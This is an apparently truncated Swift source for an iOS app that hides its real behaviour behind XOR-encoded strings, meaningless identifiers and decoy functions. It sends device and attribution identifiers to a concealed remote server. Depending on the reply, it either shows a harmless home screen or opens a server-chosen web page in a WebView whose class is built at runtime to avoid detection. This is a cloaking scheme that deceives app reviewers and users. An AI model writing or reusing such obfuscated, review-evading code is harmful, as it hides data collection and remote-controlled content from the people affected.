// ZojevisJeko.swift

import SwiftUI

@main
struct ZojevisJeko: App {
    @UIApplicationDelegateAdaptor(QaweGaw.self) var jiqonanTese

    var body: some Scene {
        WindowGroup {
            QayivehZupi()
        }
    }
}


// QaweGaw.swift

import UIKit
import OneSignalFramework
import AppsFlyerLib

class QaweGaw: UIResponder, UIApplicationDelegate {

    static var orientationLock = UIInterfaceOrientationMask.all

    private enum NuxoPozu {
        case pimu
        case kecov
        case lafaq
    }

    private func wugadeluCaki() -> Double {
        return 77.8
    }

    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return QaweGaw.orientationLock
    }

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        var solinaqabo: String {
            let k: UInt8 = 0x44
            let d: [UInt8] = [0x26, 0x26, 0x73, 0x26, 0x7d, 0x77, 0x7d, 0x25, 0x69, 0x76, 0x26, 0x71, 0x22, 0x69, 0x70, 0x75, 0x75, 0x74, 0x69, 0x26, 0x22, 0x27, 0x22, 0x69, 0x76, 0x71, 0x22, 0x72, 0x26, 0x71, 0x21, 0x74, 0x76, 0x22, 0x73, 0x72]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }

        let uuid = YetadiTixus.ripicivLeri()

        OneSignal.initialize(solinaqabo, withLaunchOptions: launchOptions)
        OneSignal.login(uuid)

        YetadiTixus.shared.dexigamafTapeg()

        NotificationCenter.default.addObserver(
            self,
            selector: #selector(bopaqakepFida),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
        return true
    }

    @objc func bopaqakepFida() {
        YetadiTixus.shared.bopaqakepFida()
    }
}


// QayivehZupi.swift

import SwiftUI

struct QayivehZupi: View {
    @State private var woriyizHix: WehoxZoqi = .splash

    enum WehoxZoqi {
        case splash
        case web(URL)
        case home
    }

    private enum FimenihZik {
        case qira
        case haqu
        case duhagu
        case xomiy
    }

    var body: some View {
        switch woriyizHix {
        case .splash:
            FebaxoPage()
                .task {
                    await mekakuwJitu()
                }
                .onAppear {
                    var zuqijedetowoj: String {
                        let k: UInt8 = 0x5c
                        let d: [UInt8] = [0x33, 0x2e, 0x35, 0x39, 0x32, 0x28, 0x3d, 0x28, 0x35, 0x33, 0x32]
                        return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
                    }
                    QaweGaw.orientationLock = .portrait
                    if #available(iOS 16.0, *) {
                        if let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                            scene.requestGeometryUpdate(.iOS(interfaceOrientations: .portrait))
                        }
                    } else {
                        UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: zuqijedetowoj)
                    }
                    UIViewController.attemptRotationToDeviceOrientation()
                }

        case .web(let url):
            RadaNeyo(url: url)
        case .home:
            JeviQaxa()
                .onAppear {
                    var zuqijedetowoj: String {
                        let k: UInt8 = 0xcf
                        let d: [UInt8] = [0xa0, 0xbd, 0xa6, 0xaa, 0xa1, 0xbb, 0xae, 0xbb, 0xa6, 0xa0, 0xa1]
                        return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
                    }
                    QaweGaw.orientationLock = .portrait
                    if #available(iOS 16.0, *) {
                        if let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                            scene.requestGeometryUpdate(.iOS(interfaceOrientations: .portrait))
                        }
                    } else {
                        UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: zuqijedetowoj)
                    }
                    UIViewController.attemptRotationToDeviceOrientation()
                }
        }
    }

    private func mekakuwJitu() async {
        let qanubexLaq = Date()
        let urlStringOpt = await YetadiTixus.shared.mucogosofeCovuju()
        await Self.buzohimGoxot(since: qanubexLaq)

        guard let urlString = urlStringOpt, let url = URL(string: urlString) else {
            DispatchQueue.main.async {
                woriyizHix = .home
            }
            return
        }

        DispatchQueue.main.async {
            woriyizHix = .web(url)
        }
    }

    // Гарантирует что splash показывался минимум 3 сек
    private static func buzohimGoxot(since start: Date) async {
        let minDuration: TimeInterval = 3
        let elapsed = Date().timeIntervalSince(start)
        if elapsed < minDuration {
            let remaining = minDuration - elapsed
            try? await Task.sleep(nanoseconds: UInt64(remaining * 1_000_000_000))
        }
    }
}


// YetadiTixus.swift

import Foundation
import SwiftUI
import AppsFlyerLib
import OneSignalFramework
import AppTrackingTransparency

enum VopefotVecat: Error {
    case invalidURL
    case noData
    case decodingError
    case httpError(Int)
    case missingFields
}

struct JofixakWovaw: Decodable {
    let data: String?
    let osub: String?
    let usub: String?

    var openableURL: URL? {
        guard let s = data, !s.isEmpty else { return nil }
        return URL(string: s)
    }
}

final class YetadiTixus {

    static let shared = YetadiTixus()

    @AppStorage("mukude_detuc")  private(set) var qugifeFirisi: String?
    @AppStorage("roked_vokef") private(set) var dabesijYuba: String?
    @AppStorage("cegilo_cow")          var qeyisZuhova: Bool = false

    private var rucifJiluz = false
    private var cemaxQudug = false
    private var koxecaJodir: String = ""
    private var zalagYow: String = ""

    private var gateContinuation: CheckedContinuation<Void, Never>?

    private let pukaniPatu: Int = 131

    private func misapoJawis() -> Double {
        return 97.5
    }

    private init() {}

    static func ripicivLeri() -> String {
        let key = "pot_qahe"
        if let existing = UserDefaults.standard.string(forKey: key), !existing.isEmpty {
            return existing
        }
        let newID = UUID().uuidString.lowercased()
        UserDefaults.standard.set(newID, forKey: key)
        return newID
    }

    func rahuremLuwi(_ urlString: String) {
        dabesijYuba = urlString
    }

    func yigatodiviNibar() {
        qeyisZuhova = true
    }

    func dexigamafTapeg() {
        var fuzixewu: String {
            let k: UInt8 = 0x2f
            let d: [UInt8] = [0x45, 0x6e, 0x59, 0x75, 0x6c, 0x40, 0x56, 0x48, 0x40, 0x19, 0x16, 0x5d, 0x5b, 0x47, 0x45, 0x7a, 0x5d, 0x1c, 0x45, 0x5c, 0x65, 0x48]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var nemibiqakoroy: String {
            let k: UInt8 = 0x33
            let d: [UInt8] = [0x05, 0x04, 0x0a, 0x00, 0x02, 0x07, 0x0b, 0x01, 0x0a, 0x01]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var kedupubunit: String {
            let k: UInt8 = 0x41
            let d: [UInt8] = [0x20, 0x31, 0x31, 0x32, 0x07, 0x2d, 0x38, 0x24, 0x33, 0x05, 0x24, 0x37, 0x0a, 0x24, 0x38]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var leqofum: String {
            let k: UInt8 = 0x81
            let d: [UInt8] = [0xe0, 0xf1, 0xf1, 0xed, 0xe4, 0xc0, 0xf1, 0xf1, 0xc8, 0xc5]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        let af = AppsFlyerLib.shared()
        af.setValue(fuzixewu, forKey: kedupubunit)
        af.setValue(nemibiqakoroy, forKey: leqofum)
        if #available(iOS 14.5, *) {
            af.waitForATTUserAuthorization(timeoutInterval: 20)
        }
        zalagYow = Self.ripicivLeri()
    }

    @objc func bopaqakepFida() {
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization { [weak self] _ in
                DispatchQueue.main.async {
                    self?.remuxucejPuqare()
                }
            }
        } else {
            remuxucejPuqare()
        }
    }

    private func remuxucejPuqare() {
        AppsFlyerLib.shared().start { [weak self] dict, error in
            Task { @MainActor in
                guard let self else { return }
                if error != nil {
                    self.rucifJiluz = true
                    self.sexipedatoCileh()
                    self.soyureyacTesow()
                    return
                }
                self.koxecaJodir = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""
                self.rucifJiluz = true
                self.sexipedatoCileh()
                self.soyureyacTesow()
            }
        }
    }

    private func soyureyacTesow() {
        OneSignal.Notifications.requestPermission({ [weak self] _ in
            Task { @MainActor in
                guard let self else { return }
                self.cemaxQudug = true
                self.sexipedatoCileh()
            }
        }, fallbackToSettings: false)
    }

    private func sexipedatoCileh() {
        guard rucifJiluz, cemaxQudug else { return }
        gateContinuation?.resume()
        gateContinuation = nil

    }

    private func waitForGate() async {
        if rucifJiluz, cemaxQudug { return }
        await withCheckedContinuation { (cont: CheckedContinuation<Void, Never>) in
            gateContinuation = cont
        }
    }

    func mucogosofeCovuju() async -> String? {
        if let cached = dabesijYuba {
            return cached
        }
        if qeyisZuhova {
            return nil
        }
        await waitForGate()

        guard !koxecaJodir.isEmpty else {
            yigatodiviNibar()
            return nil
        }

        do {
            let result = try await teqinuDaf(
                appsFlyerID: koxecaJodir,
                uid: zalagYow
            )
            guard let rawData = result.data, !rawData.isEmpty else {
                yigatodiviNibar()
                return nil
            }
            // Decode + privacy check
            guard let urlString = Self.mewusokeCiba(rawData) else {
                yigatodiviNibar()
                return nil
            }
            qugifeFirisi = urlString
            dabesijYuba = urlString
            qeyisZuhova = false
            yigixoQegiv(osub: result.osub, usub: result.usub)
            return urlString
        } catch {
            yigatodiviNibar()
            return nil
        }
    }

    private func yigixoQegiv(osub: String?, usub: String?) {
        var busozamin: String {
            let k: UInt8 = 0x8b
            let d: [UInt8] = [0xe4, 0xf8, 0xfe, 0xe9]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var bowupizo: String {
            let k: UInt8 = 0x26
            let d: [UInt8] = [0x53, 0x55, 0x53, 0x44]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        if let osub, !osub.isEmpty {
            OneSignal.User.addTag(key: busozamin, value: osub)
        }
        if let usub, !usub.isEmpty {
            OneSignal.User.addTag(key: bowupizo, value: usub)
        }
    }

    private func teqinuDaf(appsFlyerID: String, uid: String) async throws -> JofixakWovaw {
        var taripemirehuda: String {
            let k: UInt8 = 0x3b
            let d: [UInt8] = [0x53, 0x4f, 0x4f, 0x4b, 0x48]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var koyenihicihe: String {
            let k: UInt8 = 0xa3
            let d: [UInt8] = [0xce, 0xc6, 0xd1, 0xd1, 0xda, 0x8e, 0xd7, 0xc2, 0xcf, 0xcc, 0xcd, 0x8d, 0xd2, 0xd6, 0xc6, 0xd0, 0xd7]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var hekuma: String {
            let k: UInt8 = 0x77
            let d: [UInt8] = [0x58, 0x16, 0x07, 0x07, 0x04, 0x11, 0x1b, 0x0e, 0x12, 0x05, 0x58, 0x12, 0x01, 0x12, 0x19, 0x03]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var deqokapewaji: String {
            let k: UInt8 = 0xaa
            let d: [UInt8] = [0xc9, 0xc5, 0xc4, 0xdc, 0xcf, 0xd8, 0xd9, 0xc3, 0xc5, 0xc4]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var rimajuten: String {
            let k: UInt8 = 0xb5
            let d: [UInt8] = [0xf4, 0xd6, 0xd6, 0xd0, 0xc5, 0xc1]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var hugetajo: String {
            let k: UInt8 = 0x7d
            let d: [UInt8] = [0x1c, 0x0d, 0x0d, 0x11, 0x14, 0x1e, 0x1c, 0x09, 0x14, 0x12, 0x13, 0x52, 0x17, 0x0e, 0x12, 0x13]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var xagocun: String {
            let k: UInt8 = 0xc1
            let d: [UInt8] = [0xa5, 0xa0, 0xb5, 0xa0]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var xuseyuvaroj: String {
            let k: UInt8 = 0x3c
            let d: [UInt8] = [0x53, 0x4f, 0x49, 0x5e]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var cakuvegimuw: String {
            let k: UInt8 = 0xe2
            let d: [UInt8] = [0x97, 0x91, 0x97, 0x80]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }

        guard let conversion = Self.neyumiWih(appsFlyerID: appsFlyerID, uid: uid) else {
            throw VopefotVecat.missingFields
        }

        var comps = URLComponents()
        comps.scheme = taripemirehuda
        comps.host = koyenihicihe
        comps.path = hekuma
        comps.queryItems = [URLQueryItem(name: deqokapewaji, value: conversion)]

        guard let url = comps.url else { throw VopefotVecat.invalidURL }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue(hugetajo, forHTTPHeaderField: rimajuten)

        let (body, response) = try await URLSession.shared.data(for: request)
        guard let http = response as? HTTPURLResponse, http.statusCode == 200 else {
            throw VopefotVecat.httpError((response as? HTTPURLResponse)?.statusCode ?? -1)
        }

        guard let json = try? JSONSerialization.jsonObject(with: body) as? [String: Any] else {
            throw VopefotVecat.decodingError
        }
        let dataValue = json[xagocun] as? String
        let osubValue = json[xuseyuvaroj] as? String
        let usubValue = json[cakuvegimuw] as? String

        return JofixakWovaw(data: dataValue, osub: osubValue, usub: usubValue)
    }

    private static func neyumiWih(appsFlyerID: String, uid: String) -> String? {
        var relixec: String {
            let k: UInt8 = 0x61
            let d: [UInt8] = [0x00, 0x11, 0x11, 0x12, 0x07, 0x0d, 0x18, 0x04, 0x13, 0x3e, 0x08, 0x05]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var qajamawobot: String {
            let k: UInt8 = 0x67
            let d: [UInt8] = [0x12, 0x0e, 0x03]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var vejihihu: String {
            let k: UInt8 = 0xa5
            let d: [UInt8] = [0xca, 0xd6, 0xfa, 0xd3, 0xc0, 0xd7, 0xd6, 0xcc, 0xca, 0xcb]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var lovawe: String {
            let k: UInt8 = 0xd5
            let d: [UInt8] = [0xb1, 0xb0, 0xa3, 0xbc, 0xb6, 0xb0, 0x8a, 0xb8, 0xba, 0xb1, 0xb0, 0xb9]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var damuhuwunoxaruy: String {
            let k: UInt8 = 0x27
            let d: [UInt8] = [0x45, 0x52, 0x49, 0x43, 0x4b, 0x42]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }

        guard !uid.isEmpty, let bundle = Bundle.main.bundleIdentifier else { return nil }

        var components = URLComponents()
        components.queryItems = [
            URLQueryItem(name: relixec, value: appsFlyerID),
            URLQueryItem(name: qajamawobot,         value: uid),
            URLQueryItem(name: vejihihu,   value: UIDevice.current.systemVersion),
            URLQueryItem(name: lovawe, value: vusutiFiyane()),
            URLQueryItem(name: damuhuwunoxaruy,      value: bundle)
        ]
        guard let qs = components.query else { return nil }
        return Data(qs.utf8).base64EncodedString()
    }

    // Обработка ответа от бэка:
    //   1. Если начинается с http:// или https:// → это plain URL
    //   2. Иначе → пробуем base64 decode
    //   3. Если результат содержит privacy pattern — возвращаем nil (organic)
    //   4. Иначе — возвращаем URL для открытия в WebView
    private static func mewusokeCiba(_ raw: String) -> String? {
        var ravaparoruxadu: String {
            let k: UInt8 = 0x5f
            let d: [UInt8] = [0x37, 0x2b, 0x2b, 0x2f, 0x65, 0x70, 0x70]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var lakorapojemoyu: String {
            let k: UInt8 = 0x2c
            let d: [UInt8] = [0x44, 0x58, 0x58, 0x5c, 0x5f, 0x16, 0x03, 0x03]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }
        var varowitija: String {
            let k: UInt8 = 0x95
            let d: [UInt8] = [0xe1, 0xf0, 0xe7, 0xf8, 0xe6, 0xf3, 0xf0, 0xf0, 0xf1]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }

        let urlString: String
        if raw.hasPrefix(ravaparoruxadu) || raw.hasPrefix(lakorapojemoyu) {
            urlString = raw
        } else if let decodedData = Data(base64Encoded: raw),
                  let decoded = String(data: decodedData, encoding: .utf8),
                  (decoded.hasPrefix(ravaparoruxadu) || decoded.hasPrefix(lakorapojemoyu)) {
            urlString = decoded
        } else {
            return nil
        }

        // Privacy заглушка — не открываем
        if urlString.range(of: varowitija, options: .caseInsensitive) != nil {
            return nil
        }
        return urlString
    }

    private static func vusutiFiyane() -> String {
        var info = utsname()
        uname(&info)
        return withUnsafeBytes(of: &info.machine) { ptr in
            String(cString: ptr.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
    }
}

import UIKit  // для UIDevice внутри static method



// RadaNeyo.swift

import SwiftUI
import UIKit
import Foundation
import ObjectiveC.runtime
import Combine

// MARK: - State

final class HogukexLuf: ObservableObject {
    @Published var dixewQenor: NSObject? = nil
    @Published var kutuTog: Bool = false
    weak var webView: NSObject?
    var urlHistory: [URL] = []
    var isNavigatingBack: Bool = false
    var negawobYinem: [NSObject] = []

    private let kepaSuwib: Int = 917
}

struct RadaNeyo: View {
    let url: URL
    @StateObject private var state = HogukexLuf()
    @State private var feyofZep: Bool = true
    @State private var vixakaSadi = UIDevice.current.orientation

    var body: some View {
        ZStack {
            ZStack {
                WiwisNuc(url: url, state: state)
                    .blur(radius: feyofZep ? 15 : 0)
                if feyofZep {
                    ProgressView()
                        .controlSize(.large)
                        .tint(.pink)
                }
            }

            ZStack {
                VStack {
                    HStack {
                        Button {
                            if !state.negawobYinem.isEmpty {
                                let lastPopup = state.negawobYinem.removeLast()
                                (lastPopup as? UIView)?.removeFromSuperview()
                                (lastPopup as? UIView)?.superview?.setNeedsLayout()
                                (lastPopup as? UIView)?.superview?.layoutIfNeeded()
                                state.dixewQenor = state.negawobYinem.last
                            } else if let mainWebView = state.webView {
                                let canGoBack = (mainWebView.value(forKey: duwubaboba) as? Bool) ?? false
                                if canGoBack {
                                    mainWebView.perform(pegoxarKid(nititi))
                                } else if state.urlHistory.count > 1 {
                                    state.urlHistory.removeLast()
                                    if let prev = state.urlHistory.last {
                                        state.isNavigatingBack = true
                                        mainWebView.perform(pegoxarKid(qilizupaxe), with: URLRequest(url: prev))
                                    }
                                }
                            }
                        } label: {
                            Image(systemName: "chevron.backward.circle.fill")
                                .resizable()
                                .frame(width: 20, height: 20)
                                .foregroundColor(.white)
                        }
                        .padding(.leading, 20).padding(.top, 15)
                        Spacer()
                    }
                    Spacer()
                }
            }
            .ignoresSafeArea()
        }
        .background(Color.black.ignoresSafeArea())
        .statusBarHidden(true)
        .onAppear {
            var zuqijedetowoj: String {
                let k: UInt8 = 0x7c
                let d: [UInt8] = [0x13, 0x0e, 0x15, 0x19, 0x12, 0x08, 0x1d, 0x08, 0x15, 0x13, 0x12]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            QaweGaw.orientationLock = .all
            if #available(iOS 16.0, *) {
                if let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                    scene.requestGeometryUpdate(.iOS(interfaceOrientations: .all))
                }
            } else {
                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: zuqijedetowoj)
            }
            UIViewController.attemptRotationToDeviceOrientation()
            DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
                feyofZep = false
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: UIDevice.orientationDidChangeNotification)) { _ in
            vixakaSadi = UIDevice.current.orientation
        }
        .onReceive(NotificationCenter.default.publisher(for: UIApplication.willEnterForegroundNotification)) { _ in }
    }
}

struct WiwisNuc: UIViewRepresentable {
    let url: URL
    @ObservedObject var state: HogukexLuf

    func makeUIView(context: Context) -> UIView {
        zuzoxuTetak()

        let prefs = kitazoWis(seyane)
        prefs.setValue(true, forKey: cilepufepe)

        let pagePrefs = kitazoWis(kowasehanog)
        pagePrefs.setValue(true, forKey: zuvica)

        var cakequdurili: String {
            let k: UInt8 = 0xbf
            let d: [UInt8] = [0xe9, 0xda, 0xcd, 0xcc, 0xd6, 0xd0, 0xd1, 0x90, 0x8e, 0x88, 0x91, 0x8d, 0x9f, 0xf2, 0xd0, 0xdd, 0xd6, 0xd3, 0xda, 0x90, 0x8e, 0x8a, 0xfa, 0x8e, 0x8b, 0x87, 0x9f, 0xec, 0xde, 0xd9, 0xde, 0xcd, 0xd6, 0x90, 0x89, 0x8f, 0x8b, 0x91, 0x8e]
            return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
        }

        let config = kitazoWis(zekocohokof)
        config.setValue(true, forKey: xagerefupec)
        config.setValue(prefs, forKey: yipeyuqen)
        config.setValue(pagePrefs, forKey: johufiqesawe)
        config.setValue(cakequdurili, forKey: kopogivaf)

        let raw = doxibuxanGazis(zugediJizu(kitanucegu), pegoxarKid(xedavukevuke))
        let webView = vexizawiWuq(raw, pegoxarKid(faqubabocivev), .zero, config) as! NSObject

        webView.setValue(context.coordinator, forKey: fomucetar)
        webView.setValue(context.coordinator, forKey: megilumanaq)
        webView.setValue(UIColor.black, forKey: "backgroundColor")
        webView.setValue(false, forKey: "opaque")
        (webView.value(forKey: ragohogatudob) as? UIScrollView)?
            .backgroundColor = UIColor(red:0.11, green:0.13, blue:0.19, alpha:1)

        context.coordinator.cecenulDaj(for: webView)
        webView.perform(pegoxarKid(qilizupaxe), with: URLRequest(url: url))
        state.webView = webView
        return webView as! UIView
    }

    func updateUIView(_ webView: UIView, context: Context) {}

    func makeCoordinator() -> XureleXidup {
        XureleXidup(state: state)
    }

    final class XureleXidup: NSObject {
        let state: HogukexLuf
        private var sereyuriYovada: NSObject?

    private func gifopWim() -> Bool {
        return true
    }

        init(state: HogukexLuf) {
            self.state = state
        }

        func cecenulDaj(for webView: NSObject) {
            sereyuriYovada = webView
            webView.addObserver(self, forKeyPath: reliwerimayeca, options: .new, context: nil)
        }

        override func observeValue(forKeyPath keyPath: String?, of object: Any?,
                                   change: [NSKeyValueChangeKey : Any]?,
                                   context: UnsafeMutableRawPointer?) {
            guard keyPath == reliwerimayeca, let webView = object as? NSObject else { return }
            webView.setValue(change?[.newKey] as? UIColor ?? .black, forKey: "backgroundColor")
        }

        @objc(webView:decidePolicyForNavigationAction:decisionHandler:)
        func webView(_ webView: Any, decidePolicyFor navigationAction: Any,
                     decisionHandler: @escaping (Int) -> Void) {
            var noximogewu: String {
                let k: UInt8 = 0xe4
                let d: [UInt8] = [0x85, 0x94, 0x94, 0x97, 0xca, 0x85, 0x94, 0x94, 0x88, 0x81, 0xca, 0x87, 0x8b, 0x89]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var xoqulohuzurog: String {
                let k: UInt8 = 0xd8
                let d: [UInt8] = [0xb1, 0xac, 0xad, 0xb6, 0xbd, 0xab, 0xf6, 0xb9, 0xa8, 0xa8, 0xb4, 0xbd, 0xf6, 0xbb, 0xb7, 0xb5]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var soqabifuvateyuk: String {
                let k: UInt8 = 0x92
                let d: [UInt8] = [0xfa, 0xe6, 0xe6, 0xe2]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var luzoyabi: String {
                let k: UInt8 = 0x91
                let d: [UInt8] = [0xf9, 0xe5, 0xe5, 0xe1, 0xe2]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var bejisivelomog: String {
                let k: UInt8 = 0x6c
                let d: [UInt8] = [0x0d, 0x0e, 0x03, 0x19, 0x18]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var xosemukejufo: String {
                let k: UInt8 = 0x8e
                let d: [UInt8] = [0xec, 0xe2, 0xe1, 0xec]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var betuwunovehah: String {
                let k: UInt8 = 0x2c
                let d: [UInt8] = [0x4a, 0x45, 0x40, 0x49]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var liwekezim: String {
                let k: UInt8 = 0xc7
                let d: [UInt8] = [0xa3, 0xa6, 0xb3, 0xa6]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            let na = navigationAction as AnyObject
            let request = na.value(forKey: "request") as? URLRequest

            if let url = request?.url {
                let scheme = url.scheme?.lowercased() ?? ""
                let urlString = url.absoluteString.lowercased()

                if urlString.contains(noximogewu) || urlString.contains(xoqulohuzurog) {
                    UIApplication.shared.open(url)
                    decisionHandler(0) // cancel
                    return
                }

                if scheme != soqabifuvateyuk && scheme != luzoyabi && scheme != bejisivelomog && scheme != xosemukejufo && scheme != betuwunovehah && scheme != liwekezim {
                    UIApplication.shared.open(url, options: [:]) { [weak self] success in
                        guard let self else { return }
                        if !success {
                            if let fallback = self.extractFallbackURL(from: url) {
                                UIApplication.shared.open(fallback)
                            } else {
                                self.showAppNotInstalledAlert()
                            }
                        }
                    }
                    decisionHandler(0) // cancel
                    return
                }
            }
            decisionHandler(1) // allow
        }

        private func extractFallbackURL(from url: URL) -> URL? {
            var guxaji: String {
                let k: UInt8 = 0x25
                let d: [UInt8] = [0x43, 0x44, 0x49, 0x49, 0x47, 0x44, 0x46, 0x4e]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var robahanodibogi: String {
                let k: UInt8 = 0x3b
                let d: [UInt8] = [0x5d, 0x5a, 0x57, 0x57, 0x59, 0x5a, 0x58, 0x50, 0x64, 0x4e, 0x49, 0x57]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var mixodefebo: String {
                let k: UInt8 = 0x30
                let d: [UInt8] = [0x52, 0x42, 0x5f, 0x47, 0x43, 0x55, 0x42, 0x6f, 0x56, 0x51, 0x5c, 0x5c, 0x52, 0x51, 0x53, 0x5b, 0x6f, 0x45, 0x42, 0x5c]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var sutedakef: String {
                let k: UInt8 = 0x4d
                let d: [UInt8] = [0x3f, 0x28, 0x29, 0x24, 0x3f, 0x28, 0x2e, 0x39, 0x12, 0x38, 0x3f, 0x21]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            var kajusuyiwohogiq: String {
                let k: UInt8 = 0x28
                let d: [UInt8] = [0x5a, 0x4d, 0x5c, 0x5d, 0x5a, 0x46, 0x77, 0x5d, 0x5a, 0x44]
                return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
            }
            guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else { return nil }
            let params = [guxaji, robahanodibogi, mixodefebo, sutedakef, kajusuyiwohogiq]
            for param in params {
                if let value = components.queryItems?.first(where: { $0.name == param })?.value,
                   let fallback = URL(string: value) {
                    return fallback
                }
            }
            return nil
        }

        private func showAppNotInstalledAlert() {
            DispatchQueue.main.async {
                let alert = UIAlertController(
                    title: "App Required",
                    message: "Please install the required app to continue.",
                    preferredStyle: .alert
                )
                alert.addAction(UIAlertAction(title: "OK", style: .default))
                if let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                   let root = scene.windows.first?.rootViewController {
                    root.present(alert, animated: true)
                }
            }
        }

        @objc(webView:createWebViewWithConfiguration:forNavigationAction:windowFeatures:)
        func webView(_ webView: Any, createWebViewWith configuration: Any,
                     for navigationAction: Any, windowFeatures: Any) -> Any? {
            let na = navigationAction as AnyObject
            let targetFrame = na.value(forKey: "targetFrame") as AnyObject?
            let isMain = (targetFrame?.value(forKey: "isMainFrame") as? Bool) ?? false
            guard !isMain else { return nil }

            let parentWebView = webView as! NSObject
            let cfg = configuration as AnyObject
            let raw = doxibuxanGazis(zugediJizu(kitanucegu), pegoxarKid(xedavukevuke))
            let popup = vexizawiWuq(raw, pegoxarKid(faqubabocivev), .zero, cfg) as! NSObject
            popup.setValue(self, forKey: fomucetar)
            popup.setValue(self, forKey: megilumanaq)
            if let popupView = popup as? UIView {
                popupView.translatesAutoresizingMaskIntoConstraints = false
                popupView.backgroundColor = UIColor.systemBackground
                popupView.isOpaque = false
                (popup.value(forKey: ragohogatudob) as? UIScrollView)?.backgroundColor = UIColor.systemBackground
                if let parentView = parentWebView as? UIView {
                    parentView.addSubview(popupView)
                    NSLayoutConstraint.activate([
                        popupView.topAnchor.constraint(equalTo: parentView.topAnchor),
                        popupView.bottomAnchor.constraint(equalTo: parentView.bottomAnchor),
                        popupView.leadingAnchor.constraint(equalTo: parentView.leadingAnchor),
                        popupView.trailingAnchor.constraint(equalTo: parentView.trailingAnchor)
                    ])
                }
            }
            state.negawobYinem.append(popup)
            state.dixewQenor = popup
            return popup
        }

        @objc(webView:didFinishNavigation:)
        func webView(_ webView: Any, didFinish navigation: Any?) {
            let wv = webView as! NSObject
            wv.setValue(true, forKey: kufoqaqocipuxuc)
            if let cfg = wv.value(forKey: qobidi) as? NSObject {
                cfg.setValue(NSNumber(value: -1), forKey: fipucuwohumivaq) // .all = -1
                cfg.setValue(false, forKey: puhuvuyuxawusex)
            }

            if wv === state.webView, let url = wv.value(forKey: cotavaposeqerod) as? URL {
                if state.isNavigatingBack {
                    state.isNavigatingBack = false
                } else if state.urlHistory.last != url {
                    state.urlHistory.append(url)
                }
            }

            if YetadiTixus.shared.dabesijYuba == nil,
               let finalUrl = (wv.value(forKey: cotavaposeqerod) as? URL)?.absoluteURL.absoluteString {
                YetadiTixus.shared.rahuremLuwi(finalUrl)
            } else {
                YetadiTixus.shared.yigatodiviNibar()
            }
        }

        @objc(webViewDidClose:)
        func webViewDidClose(_ webView: Any) {
            let wv = webView as! NSObject
            if let index = state.negawobYinem.firstIndex(where: { $0 === wv }) {
                state.negawobYinem.remove(at: index)
                (wv as? UIView)?.removeFromSuperview()
